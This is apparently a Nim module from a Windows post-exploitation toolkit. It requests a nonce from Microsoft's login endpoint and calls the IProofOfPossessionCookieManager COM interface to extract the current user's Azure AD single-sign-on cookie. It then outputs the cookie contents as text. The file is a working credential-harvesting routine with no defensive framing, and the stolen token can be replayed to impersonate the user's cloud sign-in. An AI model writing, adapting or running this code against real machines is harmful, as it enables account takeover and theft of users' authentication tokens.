import std/json

import puppy

import winim/com
import ../utils

# This helped structure interfaces https://github.com/khchen/winim/issues/69
let
    CLSID_ProofOfPossessionCookieInfoManager = DEFINE_GUID("A9927F85-A304-4390-8B23-A75F1C668600")
    IID_IProofOfPossessionCookieManager = DEFINE_GUID("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")
type
    ProofOfPossessionCookieInfo = object
        Name: LPCWSTR
        Data: LPCWSTR
        Flags: DWORD
        P3PHeader: LPCWSTR
    
    pProofOfPossessionCookieInfo = ptr ProofOfPossessionCookieInfo
    
    IProofOfPossessionCookieManager {.pure.} = object
        lpVtbl: ptr IProofOfPossessionCookieManagerVtbl

    IProofOfPossessionCookieManagerVtbl {.pure, inheritable.} = object of IUnknownVtbl
        GetCookieInfoForUri*: proc(self: ptr IProofOfPossessionCookieManager, uri: LPCWSTR, cookieCount: ptr DWORD, cookieInfo: ptr pProofOfPossessionCookieInfo): HRESULT


proc runSSO*(): string =

    var 
        manager: ptr IProofOfPossessionCookieManager
        nonce: string
        cookieCount: DWORD
        cookieInfo: pProofOfPossessionCookieInfo
        uri: string = "https://login.microsoftonline.com/?sso_nonce="

    CoInitialize(nil)

    if CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, nil, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieManager, cast[ptr PVOID](addr manager)).FAILED:
        return "Failed to create instance of IProofOfPossessionCookieManager"
    
    # Grab a nonce
    try:
        let response = post("https://login.microsoftonline.com/common/oauth2/v2.0/token",
                            @[("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)"),
                                ("UA-CPU", "AMD64")],
                            "grant_type=srv_challenge")
        nonce = parseJson(response.body)["Nonce"].getStr
    except:
        result.add "Failed to get nonce " & getCurrentExceptionMsg()
        return result
    
    if manager.lpVtbl.GetCookieInfoForUri(manager, uri & nonce, addr cookieCount, addr cookieInfo).SUCCEEDED:
        result.add makeSectionTitle("SSO Cookie Info")
        result.add "\tRequest: " & $uri & nonce & "\n"
        result.add "\tCookie Info: " & $cookieInfo[] & "\n"
    else:
        return "Failed to get cookie info"
